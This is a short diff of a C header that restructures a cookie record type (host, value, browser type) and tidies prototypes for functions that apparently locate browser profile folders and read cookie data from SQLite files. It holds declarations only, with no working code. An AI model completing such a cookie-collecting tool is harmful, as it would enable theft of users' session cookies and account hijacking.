@@ -35,11 +35,12 @@ uint32_t;
 
 #ifndef cookies_datatype
 
-struct cookies_datatype {
-        char*   host;
-        char*   value;
+typedef struct {
+        char    host[100];
+        char    value[256];
         uint8_t b_type;
-};
+}
+cookies_datatype;
 
 #endif
 
@@ -56,8 +57,15 @@ browser_prediction;
 
 #endif
 
+
+/* Main function prototypes.
+*/
 void dir_reader(const char* directory, char** files);
+
 uint8_t check_file_in_dir(char* filename, const char* dir);
+
 browser_prediction check_browsers(char* local, char* roaming);
-struct cookies_datatype* collect_data(browser_prediction status);
-void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt);
+
+void collect_data(browser_prediction status);
+
+void get_sql(const char* sql_path, uint8_t bt);
